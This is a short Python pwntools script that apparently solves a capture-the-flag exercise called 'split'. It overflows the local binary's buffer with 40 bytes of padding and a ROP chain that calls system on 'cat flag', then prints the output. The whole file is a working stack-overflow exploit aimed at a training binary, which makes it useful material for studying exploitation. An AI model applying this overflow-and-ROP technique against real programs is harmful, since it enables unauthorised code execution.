import pwn

# Setup enviroment
process = pwn.process("./split")
pwn.context(os="linux", arch="amd64")
elf = pwn.ELF("split")
rop = pwn.ROP(elf)

rop.system(next(elf.search("cat flag")))
print str(rop.dump())

process.readline()
process.readline()
process.readline()
payload  = "A" * 40 + rop.chain()
print payload
process.sendline(payload)
process.readline()
print process.readline()[2:]
process.shutdown()
